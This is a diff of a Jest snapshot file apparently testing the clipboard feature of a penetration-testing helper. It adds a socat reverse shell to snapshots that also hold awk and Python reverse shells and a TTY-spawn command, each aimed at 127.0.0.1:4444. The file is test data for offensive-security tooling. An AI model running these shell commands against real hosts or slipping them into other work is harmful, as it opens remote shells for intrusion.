@@ -21,6 +21,9 @@ Array [
     "\\"awk 'BEGIN {s = \\\\\\"/inet/tcp/0/127.0.0.1/4444\\\\\\"; while(42) { do{ printf \\\\\\"shell>\\\\\\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \\\\\\"exit\\\\\\") close(s); }}' /dev/null\\"",
   ],
   Array [
+    "\\"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:4444\\"",
+  ],
+  Array [
     "\\"python -c 'import pty;pty.spawn(\\\\\\"/bin/bash\\\\\\")'\\"",
   ],
   Array [
@@ -41,11 +44,13 @@ exports[`copy commands can copy various strings to the clipboard 5`] = `"reverse
 
 exports[`copy commands can copy various strings to the clipboard 6`] = `"reverse shell (awk)"`;
 
-exports[`copy commands can copy various strings to the clipboard 7`] = `"spawn a TTY shell (linux)"`;
+exports[`copy commands can copy various strings to the clipboard 7`] = `"reverse shell (socat)"`;
 
-exports[`copy commands can copy various strings to the clipboard 8`] = `"find files/folders with write access (linux)"`;
+exports[`copy commands can copy various strings to the clipboard 8`] = `"spawn a TTY shell (python)"`;
 
-exports[`copy commands can copy various strings to the clipboard 9`] = `
+exports[`copy commands can copy various strings to the clipboard 9`] = `"find files/folders with write access (linux)"`;
+
+exports[`copy commands can copy various strings to the clipboard 10`] = `
 Array [
   Array [
     "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"127.0.0.1\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\"/bin/bash\\")'",
@@ -64,6 +69,9 @@ Array [
   ],
   Array [
     "awk 'BEGIN {s = \\"/inet/tcp/0/127.0.0.1/4444\\"; while(42) { do{ printf \\"shell>\\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \\"exit\\") close(s); }}' /dev/null",
+  ],
+  Array [
+    "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:4444",
   ],
   Array [
     "python -c 'import pty;pty.spawn(\\"/bin/bash\\")'",
